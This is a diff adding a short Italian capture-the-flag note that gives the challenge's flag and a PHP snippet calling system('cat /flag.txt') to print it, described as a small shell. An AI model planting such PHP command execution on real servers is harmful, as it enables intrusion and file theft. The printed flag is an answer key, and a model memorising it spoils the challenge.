@@ -1,0 +1,7 @@
+fare questa piccola shell che printerà direttamente la flag flag{sh3l1_p0w3r_1s_k00p4_p0w3r}
+
+<?php 
+echo system("cat /flag.txt");
+?>
+
+cat serve per aprire i file su linux
